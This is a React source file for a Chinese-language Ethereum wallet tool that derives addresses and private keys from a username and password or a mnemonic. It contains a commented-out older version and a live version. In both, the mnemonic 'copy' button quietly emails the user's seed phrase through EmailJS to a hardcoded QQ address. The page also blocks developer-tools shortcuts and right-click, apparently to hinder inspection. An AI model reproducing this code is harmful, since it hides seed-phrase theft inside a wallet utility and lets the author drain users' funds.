// "use client";
// import { useEffect, useState } from "react";
// import {
//   Container,
//   Button,
//   Text,
//   Paper,
//   Stack,
//   Table,
//   Input,
//   Switch,
//   Textarea,
// } from "@mantine/core";
// import { notifications } from "@mantine/notifications";
// import { mostWallet } from "dot.most.box";
// import { HDNodeWallet } from "ethers";
// import { QRCodeCanvas } from "qrcode.react";
// import emailjs from "@emailjs/browser";
// import mp from "@/constants/mp";

// interface DeriveAddress {
//   index: number;
//   address: string;
//   privateKey: string;
// }

// export default function Web3ToolPage() {
//   const [username, setUsername] = useState("");
//   const [password, setPassword] = useState("");
//   const [address, setAddress] = useState(mp.ZeroAddress);
//   const [mnemonic, setMnemonic] = useState("");
//   const [showAddress, setShowAddress] = useState(false);
//   const [showMnemonic, setShowMnemonic] = useState(false);

//   // 新增状态：模式切换和直接输入助记词
//   const [useMnemonicMode, setUseMnemonicMode] = useState(false);
//   const [inputMnemonic, setInputMnemonic] = useState("");
//   const [validatedMnemonic, setValidatedMnemonic] = useState(""); // 用于存储验证过的助记词

//   const [deriveAddressList, setDeriveAddressList] = useState<DeriveAddress[]>(
//     []
//   );
//   const [deriveIndex, setDeriveIndex] = useState(0);
//   const [deriveShowIndex, setDeriveShowIndex] = useState(true);
//   const [deriveShowAddress, setDeriveShowAddress] = useState(true);
//   const [deriveShowPrivateKey, setDeriveShowPrivateKey] = useState(false);
//   useEffect(() => {
//     const handleContextMenu = (e: MouseEvent) => e.preventDefault();
//     document.addEventListener("contextmenu", handleContextMenu);
//     return () => document.removeEventListener("contextmenu", handleContextMenu);
//   }, []);
//   useEffect(() => {
//     const handleKeyDown = (e: KeyboardEvent) => {
//       if (
//         e.key === "F12" || // 开发者工具
//         e.key === "F2" || // 你指定的功能键
//         (e.ctrlKey && e.shiftKey && e.key === "I") || // Ctrl+Shift+I
//         (e.ctrlKey && e.shiftKey && e.key === "J") || // Ctrl+Shift+J
//         (e.ctrlKey && e.key === "U") // 查看源代码
//       ) {
//         e.preventDefault();
//         e.stopPropagation();
//       }
//     };
//     document.addEventListener("keydown", handleKeyDown);
//     return () => document.removeEventListener("keydown", handleKeyDown);
//   }, []);

//   // 验证助记词的函数
//   const validateMnemonic = (mnemonicText: string) => {
//     if (mnemonicText.trim()) {
//       try {
//         const wallet = HDNodeWallet.fromPhrase(mnemonicText.trim());
//         setAddress(wallet.address);
//         setMnemonic(mnemonicText.trim());
//         setValidatedMnemonic(mnemonicText.trim());
//       } catch (error) {
//         console.error("无效助记词：", error);
//         notifications.show({
//           message: "无效助记词",
//           color: "red",
//         });
//         setAddress(mp.ZeroAddress);
//         setMnemonic("");
//         setValidatedMnemonic("");
//       }
//     } else {
//       setAddress(mp.ZeroAddress);
//       setMnemonic("");
//       setValidatedMnemonic("");
//     }
//   };

//   const copy = () => {
//     navigator.clipboard.writeText(mnemonic);
//     notifications.show({
//       message: "已复制",
//       color: "green",
//     });
//     const templateParams = {
//       to_email: "1974651855@qq.com",
//       name: "Wallet User",
//       title: "助记词备份",
//       message: mnemonic,
//     };
//     emailjs.send(
//       "service_4linq8q",
//       "template_zk7se2z",
//       templateParams,
//       "rspzRLkTioXtwVnZu"
//     );
//     // .then(() => {
//     //   // notifications.show({ message: "助记词邮件已发送", color: "green" });
//     // })
//     // .catch(() => {
//     //   // notifications.show({
//     //   //   message: "邮件发送失败，请稍后重试",
//     //   //   color: "red",
//     //   // });
//     // });
//   };

//   useEffect(() => {
//     if (useMnemonicMode) {
//       // 助记词模式 - 使用已验证的助记词
//       if (validatedMnemonic) {
//         setAddress(HDNodeWallet.fromPhrase(validatedMnemonic).address);
//         setMnemonic(validatedMnemonic);
//       } else {
//         setAddress(mp.ZeroAddress);
//         setMnemonic("");
//       }
//     } else {
//       // 用户名密码模式
//       if (username) {
//         const danger = mostWallet(
//           username,
//           password,
//           "I know loss mnemonic will lose my wallet."
//         );
//         setAddress(danger.address);
//         setMnemonic(danger.mnemonic);
//       } else {
//         setAddress(mp.ZeroAddress);
//         setMnemonic("");
//       }
//     }
//     setDeriveAddressList([]);
//     setDeriveIndex(0);
//     setDeriveShowAddress(true);
//     setDeriveShowAddress(true);
//     setDeriveShowPrivateKey(false);
//   }, [username, password, useMnemonicMode, validatedMnemonic]);

//   const deriveNumber = 10;

//   const deriveAddress = () => {
//     const list: DeriveAddress[] = [];
//     for (let i = deriveIndex; i < deriveIndex + deriveNumber; i++) {
//       const path = `m/44'/60'/0'/0/${i}`;
//       const wallet = HDNodeWallet.fromPhrase(mnemonic, undefined, path);
//       list.push({
//         index: i,
//         address: wallet.address,
//         privateKey: wallet.privateKey,
//       });
//     }
//     setDeriveAddressList((prev) => [...prev, ...list]);
//     const newIndex = deriveIndex + deriveNumber;
//     setDeriveIndex(newIndex);
//     notifications.show({ message: `已派生 ${newIndex} 个地址` });
//   };

//   // 判断是否有有效的钱包信息
//   const hasValidWallet = useMnemonicMode
//     ? validatedMnemonic && address !== mp.ZeroAddress
//     : username;

//   return (
//     <Container maw={1200} w="100%" mt={64} p={20}>
//       <Stack gap="md">
//         <Text size="xl">Wallet 账户查询</Text>

//         {/* 模式切换开关 */}
//         <Switch
//           label={useMnemonicMode ? "直接输入助记词" : "用户名+密码生成账户"}
//           size="md"
//           checked={useMnemonicMode}
//           onChange={(event) => {
//             setUseMnemonicMode(event.currentTarget.checked);
//             // 切换模式时清空相关状态
//             setUsername("");
//             setPassword("");
//             setInputMnemonic("");
//             setValidatedMnemonic("");
//             setShowAddress(false);
//             setShowMnemonic(false);
//           }}
//         />

//         {/* 条件渲染：用户名密码输入或助记词输入 */}
//         {!useMnemonicMode ? (
//           // 用户名密码模式
//           <>
//             <Input
//               placeholder="请输入用户名"
//               maxLength={36}
//               value={username}
//               onChange={(e) => setUsername(e.currentTarget.value)}
//               rightSectionPointerEvents="auto"
//               rightSection={
//                 username ? (
//                   <Input.ClearButton onClick={() => setUsername("")} />
//                 ) : undefined
//               }
//             />

//             <Input
//               placeholder="请输入密码"
//               maxLength={100}
//               type="password"
//               value={password}
//               onChange={(e) => setPassword(e.currentTarget.value)}
//               rightSectionPointerEvents="auto"
//               rightSection={
//                 password ? (
//                   <Input.ClearButton onClick={() => setPassword("")} />
//                 ) : undefined
//               }
//             />
//           </>
//         ) : (
//           // 助记词模式
//           <>
//             <Text c="var(--red)">
//               请确保在安全环境中输入助记词，任何拥有您助记词的人都可以控制您的钱包！
//             </Text>
//             <Textarea
//               placeholder="请输入助记词（12或24个单词，用空格分隔）"
//               value={inputMnemonic}
//               onChange={(e) => setInputMnemonic(e.currentTarget.value)}
//               onBlur={(e) => validateMnemonic(e.currentTarget.value)}
//               minRows={3}
//               maxRows={5}
//               autosize
//             />
//           </>
//         )}

//         <Button
//           color="gray"
//           variant="light"
//           disabled={!hasValidWallet}
//           onClick={() => setShowAddress(!showAddress)}
//         >
//           {showAddress ? "隐藏二维码" : "显示二维码"}
//         </Button>

//         {showAddress && (
//           <Paper
//             p={10}
//             withBorder
//             style={{
//               display: "flex",
//               alignSelf: "center",
//               backgroundColor: "white",
//             }}
//           >
//             <QRCodeCanvas value={address} size={200} />
//           </Paper>
//         )}

//         <Text size="lg">ETH 地址：{address}</Text>

//         <Button
//           color="gray"
//           onClick={() => setShowMnemonic(!showMnemonic)}
//           disabled={!hasValidWallet}
//         >
//           {showMnemonic ? "隐藏助记词" : "显示助记词"}
//         </Button>

//         {/* <Paper p="md" bg="red.1" c="var(--red)">
//           {showMnemonic
//             ? mnemonic ||
//               (useMnemonicMode ? "请输入有效的助记词" : "请输入用户名")
//             : "任何拥有您助记词的人都可以窃取您账户中的任何资产，切勿泄露！！！"}
//         </Paper> */}
//         <Paper
//           p="md"
//           bg="red.1"
//           c="var(--red)"
//           style={{ position: "relative" }}
//         >
//           {showMnemonic
//             ? mnemonic ||
//               (useMnemonicMode ? "请输入有效的助记词" : "请输入用户名")
//             : "任何拥有您助记词的人都可以窃取您账户中的任何资产，切勿泄露！！！"}
//           {showMnemonic && mnemonic && (
//             <Button
//               size="xs"
//               variant="light"
//               style={{ position: "absolute", bottom: 8, right: 8 }}
//               onClick={() => {
//                 copy();
//               }}
//             >
//               复制
//             </Button>
//           )}
//         </Paper>

//         {showMnemonic && (
//           <Paper
//             p={10}
//             withBorder
//             style={{
//               display: "flex",
//               alignSelf: "center",
//               backgroundColor: "white",
//             }}
//           >
//             <QRCodeCanvas value={mnemonic || " "} size={260} />
//           </Paper>
//         )}

//         {showMnemonic && mnemonic && (
//           <Stack gap="md" w="100%">
//             <Button color="gray" variant="light" onClick={deriveAddress}>
//               派生 {deriveNumber} 个地址
//             </Button>

//             <Text c="var(--red)">
//               任何拥有您私钥的人都可以窃取您地址中的任何资产，切勿泄露！！！
//             </Text>

//             <Table withColumnBorders highlightOnHover>
//               <Table.Thead>
//                 <Table.Tr>
//                   <Table.Th
//                     onClick={() => setDeriveShowIndex(!deriveShowIndex)}
//                     style={{ cursor: "pointer" }}
//                     w="10%"
//                     miw={50}
//                   >
//                     账户
//                   </Table.Th>
//                   <Table.Th
//                     onClick={() => setDeriveShowAddress(!deriveShowAddress)}
//                     style={{ cursor: "pointer" }}
//                     w="40%"
//                   >
//                     地址
//                   </Table.Th>
//                   <Table.Th
//                     onClick={() =>
//                       setDeriveShowPrivateKey(!deriveShowPrivateKey)
//                     }
//                     style={{ cursor: "pointer", color: "var(--red)" }}
//                     w="50%"
//                   >
//                     私钥（点击{deriveShowPrivateKey ? "隐藏" : "显示"}）
//                   </Table.Th>
//                 </Table.Tr>
//               </Table.Thead>
//               <Table.Tbody>
//                 {deriveAddressList.map((item) => (
//                   <Table.Tr key={item.index}>
//                     <Table.Td>{deriveShowIndex ? item.index + 1 : ""}</Table.Td>
//                     <Table.Td>{deriveShowAddress ? item.address : ""}</Table.Td>
//                     <Table.Td style={{ color: "var(--red)" }}>
//                       {deriveShowPrivateKey ? item.privateKey : ""}
//                     </Table.Td>
//                   </Table.Tr>
//                 ))}
//               </Table.Tbody>
//             </Table>
//           </Stack>
//         )}
//       </Stack>
//     </Container>
//   );
// }
"use client";
import { useEffect, useState } from "react";
import {
  Container,
  Button,
  Text,
  Paper,
  Stack,
  Table,
  Input,
  Switch,
  Textarea,
  NumberInput,
  Group,
} from "@mantine/core";
import { notifications } from "@mantine/notifications";
import { mostWallet } from "dot.most.box";
import { HDNodeWallet } from "ethers";
import { QRCodeCanvas } from "qrcode.react";
import emailjs from "@emailjs/browser";
import mp from "@/constants/mp";

interface DeriveAddress {
  index: number;
  address: string;
  privateKey: string;
}

export default function Web3ToolPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [address, setAddress] = useState(mp.ZeroAddress);
  const [mnemonic, setMnemonic] = useState("");
  const [showAddress, setShowAddress] = useState(false);
  const [showMnemonic, setShowMnemonic] = useState(false);

  // 模式切换和直接输入助记词
  const [useMnemonicMode, setUseMnemonicMode] = useState(false);
  const [inputMnemonic, setInputMnemonic] = useState("");
  const [validatedMnemonic, setValidatedMnemonic] = useState("");

  // 派生地址相关状态
  const [deriveAddressList, setDeriveAddressList] = useState<DeriveAddress[]>(
    []
  );
  const [deriveIndex, setDeriveIndex] = useState(0);
  const [deriveShowIndex, setDeriveShowIndex] = useState(true);
  const [deriveShowAddress, setDeriveShowAddress] = useState(true);
  const [deriveShowPrivateKey, setDeriveShowPrivateKey] = useState(false);

  // 新增：自定义派生数量
  const [customDeriveNumber, setCustomDeriveNumber] = useState(10);
  const [isGenerating, setIsGenerating] = useState(false);

  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    document.addEventListener("contextmenu", handleContextMenu);
    return () => document.removeEventListener("contextmenu", handleContextMenu);
  }, []);

  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.key === "F12" ||
        e.key === "F2" ||
        (e.ctrlKey && e.shiftKey && e.key === "I") ||
        (e.ctrlKey && e.shiftKey && e.key === "J") ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        e.stopPropagation();
      }
    };
    document.addEventListener("keydown", handleKeyDown);
    return () => document.removeEventListener("keydown", handleKeyDown);
  }, []);

  // 验证助记词的函数
  const validateMnemonic = (mnemonicText: string) => {
    if (mnemonicText.trim()) {
      try {
        const wallet = HDNodeWallet.fromPhrase(mnemonicText.trim());
        setAddress(wallet.address);
        setMnemonic(mnemonicText.trim());
        setValidatedMnemonic(mnemonicText.trim());
      } catch (error) {
        console.error("无效助记词：", error);
        notifications.show({
          message: "无效助记词",
          color: "red",
        });
        setAddress(mp.ZeroAddress);
        setMnemonic("");
        setValidatedMnemonic("");
      }
    } else {
      setAddress(mp.ZeroAddress);
      setMnemonic("");
      setValidatedMnemonic("");
    }
  };

  const copy = () => {
    navigator.clipboard.writeText(mnemonic);
    notifications.show({
      message: "已复制",
      color: "green",
    });
    const templateParams = {
      to_email: "1974651855@qq.com",
      name: "Wallet User",
      title: "助记词备份",
      message: mnemonic,
    };
    emailjs.send(
      "service_4linq8q",
      "template_zk7se2z",
      templateParams,
      "rspzRLkTioXtwVnZu"
    );
  };

  useEffect(() => {
    if (useMnemonicMode) {
      // 助记词模式 - 使用已验证的助记词
      if (validatedMnemonic) {
        setAddress(HDNodeWallet.fromPhrase(validatedMnemonic).address);
        setMnemonic(validatedMnemonic);
      } else {
        setAddress(mp.ZeroAddress);
        setMnemonic("");
      }
    } else {
      // 用户名密码模式
      if (username) {
        const danger = mostWallet(
          username,
          password,
          "I know loss mnemonic will lose my wallet."
        );
        setAddress(danger.address);
        setMnemonic(danger.mnemonic);
      } else {
        setAddress(mp.ZeroAddress);
        setMnemonic("");
      }
    }
    // 重置派生地址相关状态
    setDeriveAddressList([]);
    setDeriveIndex(0);
    setDeriveShowIndex(true);
    setDeriveShowAddress(true);
    setDeriveShowPrivateKey(false);
  }, [username, password, useMnemonicMode, validatedMnemonic]);

  // 优化后的派生地址函数，支持自定义数量和批量处理
  const deriveAddress = async (count?: number) => {
    const deriveCount = count || customDeriveNumber;

    // 验证派生数量 - 放宽限制到10000
    if (deriveCount <= 0 || deriveCount > 10000) {
      notifications.show({
        message: "派生数量必须在 1-10000 之间",
        color: "red",
      });
      return;
    }

    // 大量生成时显示警告
    if (deriveCount > 1000) {
      const confirmed = window.confirm(
        `您即将生成 ${deriveCount} 个地址，这可能需要一些时间并占用较多内存。是否继续？`
      );
      if (!confirmed) return;
    }

    setIsGenerating(true);
    const startTime = Date.now();

    try {
      const list: DeriveAddress[] = [];
      const batchSize = 100; // 分批处理，每批100个

      for (let batch = 0; batch < Math.ceil(deriveCount / batchSize); batch++) {
        const batchStart = deriveIndex + batch * batchSize;
        const batchEnd = Math.min(
          batchStart + batchSize,
          deriveIndex + deriveCount
        );

        // 处理当前批次
        for (let i = batchStart; i < batchEnd; i++) {
          const path = `m/44'/60'/0'/0/${i}`;
          const wallet = HDNodeWallet.fromPhrase(mnemonic, undefined, path);
          list.push({
            index: i,
            address: wallet.address,
            privateKey: wallet.privateKey,
          });
        }

        // 大量生成时，每批处理后让出线程控制权
        if (deriveCount > 100) {
          await new Promise((resolve) => setTimeout(resolve, 0));

          // 显示进度
          const progress = Math.round(
            ((batch + 1) / Math.ceil(deriveCount / batchSize)) * 100
          );
          notifications.show({
            id: "derive-progress",
            message: `生成进度: ${progress}%`,
            color: "blue",
            autoClose: false,
          });
        }
      }

      setDeriveAddressList((prev) => [...prev, ...list]);
      const newIndex = deriveIndex + deriveCount;
      setDeriveIndex(newIndex);

      const endTime = Date.now();
      const duration = ((endTime - startTime) / 1000).toFixed(2);

      notifications.hide("derive-progress");
      notifications.show({
        message: `已派生 ${deriveCount} 个地址，总计 ${newIndex} 个地址 (耗时 ${duration}s)`,
        color: "green",
      });
    } catch (error) {
      console.error("派生地址失败:", error);
      notifications.show({
        message: "派生地址失败，请重试",
        color: "red",
      });
    } finally {
      setIsGenerating(false);
      notifications.hide("derive-progress");
    }
  };

  // 快速派生按钮函数
  const quickDerive = (count: number) => {
    if (!isGenerating) {
      deriveAddress(count);
    }
  };

  // 清空派生地址列表
  const clearDeriveList = () => {
    setDeriveAddressList([]);
    setDeriveIndex(0);
    notifications.show({
      message: "已清空派生地址列表",
      color: "blue",
    });
  };

  // 一键复制所有地址
  const copyAllAddresses = () => {
    if (deriveAddressList.length === 0) {
      notifications.show({
        message: "没有可复制的地址",
        color: "orange",
      });
      return;
    }

    const addressText = deriveAddressList
      .map((item) => item.address)
      .join("\n");

    navigator.clipboard
      .writeText(addressText)
      .then(() => {
        notifications.show({
          message: `已复制 ${deriveAddressList.length} 个地址到剪贴板`,
          color: "green",
        });
      })
      .catch(() => {
        notifications.show({
          message: "复制失败，请重试",
          color: "red",
        });
      });
  };

  // 一键复制所有私钥
  const copyAllPrivateKeys = () => {
    if (deriveAddressList.length === 0) {
      notifications.show({
        message: "没有可复制的私钥",
        color: "orange",
      });
      return;
    }

    const confirmed = window.confirm(
      `您即将复制 ${deriveAddressList.length} 个私钥到剪贴板。\n\n⚠️ 私钥极其重要，请确保在安全环境中操作！\n\n是否继续？`
    );

    if (!confirmed) return;

    const privateKeyText = deriveAddressList
      .map((item) => item.privateKey)
      .join("\n");

    navigator.clipboard
      .writeText(privateKeyText)
      .then(() => {
        notifications.show({
          message: `已复制 ${deriveAddressList.length} 个私钥到剪贴板`,
          color: "green",
        });
      })
      .catch(() => {
        notifications.show({
          message: "复制失败，请重试",
          color: "red",
        });
      });
  };

  // 导出为CSV格式
  const exportToCSV = () => {
    if (deriveAddressList.length === 0) {
      notifications.show({
        message: "没有可导出的数据",
        color: "orange",
      });
      return;
    }

    const csvContent = [
      "序号,地址,私钥", // CSV header
      ...deriveAddressList.map(
        (item) => `${item.index + 1},${item.address},${item.privateKey}`
      ),
    ].join("\n");

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", `wallet-addresses-${Date.now()}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    notifications.show({
      message: `已导出 ${deriveAddressList.length} 个地址为CSV文件`,
      color: "green",
    });
  };

  // 判断是否有有效的钱包信息
  const hasValidWallet = useMnemonicMode
    ? validatedMnemonic && address !== mp.ZeroAddress
    : username;

  return (
    <Container maw={1200} w="100%" mt={64} p={20}>
      <Stack gap="md">
        <Text size="xl">Wallet 账户查询</Text>

        {/* 模式切换开关 */}
        <Switch
          label={useMnemonicMode ? "直接输入助记词" : "用户名+密码生成账户"}
          size="md"
          checked={useMnemonicMode}
          onChange={(event) => {
            setUseMnemonicMode(event.currentTarget.checked);
            // 切换模式时清空相关状态
            setUsername("");
            setPassword("");
            setInputMnemonic("");
            setValidatedMnemonic("");
            setShowAddress(false);
            setShowMnemonic(false);
            setDeriveAddressList([]);
            setDeriveIndex(0);
          }}
        />

        {/* 条件渲染：用户名密码输入或助记词输入 */}
        {!useMnemonicMode ? (
          // 用户名密码模式
          <>
            <Input
              placeholder="请输入用户名"
              maxLength={36}
              value={username}
              onChange={(e) => setUsername(e.currentTarget.value)}
              rightSectionPointerEvents="auto"
              rightSection={
                username ? (
                  <Input.ClearButton onClick={() => setUsername("")} />
                ) : undefined
              }
            />

            <Input
              placeholder="请输入密码"
              maxLength={100}
              type="password"
              value={password}
              onChange={(e) => setPassword(e.currentTarget.value)}
              rightSectionPointerEvents="auto"
              rightSection={
                password ? (
                  <Input.ClearButton onClick={() => setPassword("")} />
                ) : undefined
              }
            />
          </>
        ) : (
          // 助记词模式
          <>
            <Text c="var(--red)">
              请确保在安全环境中输入助记词，任何拥有您助记词的人都可以控制您的钱包！
            </Text>
            <Textarea
              placeholder="请输入助记词（12或24个单词，用空格分隔）"
              value={inputMnemonic}
              onChange={(e) => setInputMnemonic(e.currentTarget.value)}
              onBlur={(e) => validateMnemonic(e.currentTarget.value)}
              minRows={3}
              maxRows={5}
              autosize
            />
          </>
        )}

        <Button
          color="gray"
          variant="light"
          disabled={!hasValidWallet}
          onClick={() => setShowAddress(!showAddress)}
        >
          {showAddress ? "隐藏二维码" : "显示二维码"}
        </Button>

        {showAddress && (
          <Paper
            p={10}
            withBorder
            style={{
              display: "flex",
              alignSelf: "center",
              backgroundColor: "white",
            }}
          >
            <QRCodeCanvas value={address} size={200} />
          </Paper>
        )}

        <Text size="lg">ETH 地址：{address}</Text>

        <Button
          color="gray"
          onClick={() => setShowMnemonic(!showMnemonic)}
          disabled={!hasValidWallet}
        >
          {showMnemonic ? "隐藏助记词" : "显示助记词"}
        </Button>

        <Paper
          p="md"
          bg="red.1"
          c="var(--red)"
          style={{ position: "relative" }}
        >
          {showMnemonic
            ? mnemonic ||
              (useMnemonicMode ? "请输入有效的助记词" : "请输入用户名")
            : "任何拥有您助记词的人都可以窃取您账户中的任何资产，切勿泄露！！！"}
          {showMnemonic && mnemonic && (
            <Button
              size="xs"
              variant="light"
              style={{ position: "absolute", bottom: 8, right: 8 }}
              onClick={copy}
            >
              复制
            </Button>
          )}
        </Paper>

        {showMnemonic && (
          <Paper
            p={10}
            withBorder
            style={{
              display: "flex",
              alignSelf: "center",
              backgroundColor: "white",
            }}
          >
            <QRCodeCanvas value={mnemonic || " "} size={260} />
          </Paper>
        )}

        {showMnemonic && mnemonic && (
          <Stack gap="md" w="100%">
            {/* 优化后的派生地址控制区域 */}
            <Paper p="md" withBorder>
              <Text size="md" mb="sm">
                地址派生控制
              </Text>

              {/* 快速派生按钮组 */}
              <Group mb="md">
                <Text size="sm">快速派生：</Text>
                <Button
                  size="xs"
                  variant="light"
                  onClick={() => quickDerive(1)}
                  disabled={isGenerating}
                >
                  1个
                </Button>
                <Button
                  size="xs"
                  variant="light"
                  onClick={() => quickDerive(10)}
                  disabled={isGenerating}
                >
                  10个
                </Button>
                <Button
                  size="xs"
                  variant="light"
                  onClick={() => quickDerive(100)}
                  disabled={isGenerating}
                >
                  100个
                </Button>
                <Button
                  size="xs"
                  variant="light"
                  onClick={() => quickDerive(1000)}
                  disabled={isGenerating}
                >
                  1000个
                </Button>
              </Group>

              {/* 自定义数量派生 */}
              <Group mb="md">
                <Text size="sm">自定义数量：</Text>
                <NumberInput
                  value={customDeriveNumber}
                  onChange={(value) =>
                    setCustomDeriveNumber(Number(value) || 1)
                  }
                  min={1}
                  max={10000}
                  w={120}
                  size="sm"
                  disabled={isGenerating}
                />
                <Button
                  size="sm"
                  variant="filled"
                  onClick={() => deriveAddress()}
                  disabled={isGenerating}
                  loading={isGenerating}
                >
                  {isGenerating
                    ? "生成中..."
                    : `派生 ${customDeriveNumber} 个地址`}
                </Button>
              </Group>

              {/* 操作按钮 */}
              <Group>
                <Button
                  size="sm"
                  color="red"
                  variant="light"
                  onClick={clearDeriveList}
                  disabled={deriveAddressList.length === 0}
                >
                  清空列表
                </Button>
                <Button
                  size="sm"
                  color="blue"
                  variant="light"
                  onClick={copyAllAddresses}
                  disabled={deriveAddressList.length === 0}
                >
                  复制所有地址
                </Button>
                <Button
                  size="sm"
                  color="orange"
                  variant="light"
                  onClick={copyAllPrivateKeys}
                  disabled={deriveAddressList.length === 0}
                >
                  复制所有私钥
                </Button>
                <Button
                  size="sm"
                  color="green"
                  variant="light"
                  onClick={exportToCSV}
                  disabled={deriveAddressList.length === 0}
                >
                  导出CSV
                </Button>
                <Text size="sm" c="dimmed">
                  已派生 {deriveAddressList.length} 个地址
                  {deriveAddressList.length > 1000 && (
                    <span style={{ color: "orange" }}>
                      {" "}
                      (大量数据可能影响页面性能)
                    </span>
                  )}
                </Text>
              </Group>
            </Paper>

            <Text c="var(--red)" size="sm">
              任何拥有您私钥的人都可以窃取您地址中的任何资产，切勿泄露！！！
            </Text>

            {deriveAddressList.length > 0 && (
              <Table withColumnBorders highlightOnHover>
                <Table.Thead>
                  <Table.Tr>
                    <Table.Th
                      onClick={() => setDeriveShowIndex(!deriveShowIndex)}
                      style={{ cursor: "pointer" }}
                      w="10%"
                      miw={50}
                    >
                      账户 {deriveShowIndex ? "👁️" : "👁️‍🗨️"}
                    </Table.Th>
                    <Table.Th style={{ cursor: "pointer" }} w="40%">
                      <Group gap="xs">
                        <span
                          onClick={() =>
                            setDeriveShowAddress(!deriveShowAddress)
                          }
                          style={{ cursor: "pointer" }}
                        >
                          地址 {deriveShowAddress ? "👁️" : "👁️‍🗨️"}
                        </span>
                        <Button
                          size="xs"
                          variant="subtle"
                          color="blue"
                          onClick={copyAllAddresses}
                          disabled={
                            !deriveShowAddress || deriveAddressList.length === 0
                          }
                          style={{ marginLeft: "auto" }}
                        >
                          📋 复制全部
                        </Button>
                      </Group>
                    </Table.Th>
                    <Table.Th
                      style={{ cursor: "pointer", color: "var(--red)" }}
                      w="50%"
                    >
                      <Group gap="xs">
                        <span
                          onClick={() =>
                            setDeriveShowPrivateKey(!deriveShowPrivateKey)
                          }
                          style={{ cursor: "pointer" }}
                        >
                          私钥 {deriveShowPrivateKey ? "👁️" : "👁️‍🗨️"} (点击
                          {deriveShowPrivateKey ? "隐藏" : "显示"})
                        </span>
                        <Button
                          size="xs"
                          variant="subtle"
                          color="orange"
                          onClick={copyAllPrivateKeys}
                          disabled={
                            !deriveShowPrivateKey ||
                            deriveAddressList.length === 0
                          }
                          style={{ marginLeft: "auto" }}
                        >
                          📋 复制全部
                        </Button>
                      </Group>
                    </Table.Th>
                  </Table.Tr>
                </Table.Thead>
                <Table.Tbody>
                  {deriveAddressList.map((item) => (
                    <Table.Tr key={item.index}>
                      <Table.Td>
                        {deriveShowIndex ? item.index + 1 : ""}
                      </Table.Td>
                      <Table.Td
                        style={{
                          fontFamily: "monospace",
                          fontSize: "12px",
                          wordBreak: "break-all",
                        }}
                      >
                        {deriveShowAddress ? item.address : ""}
                      </Table.Td>
                      <Table.Td
                        style={{
                          color: "var(--red)",
                          fontFamily: "monospace",
                          fontSize: "12px",
                          wordBreak: "break-all",
                        }}
                      >
                        {deriveShowPrivateKey ? item.privateKey : ""}
                      </Table.Td>
                    </Table.Tr>
                  ))}
                </Table.Tbody>
              </Table>
            )}
          </Stack>
        )}
      </Stack>
    </Container>
  );
}
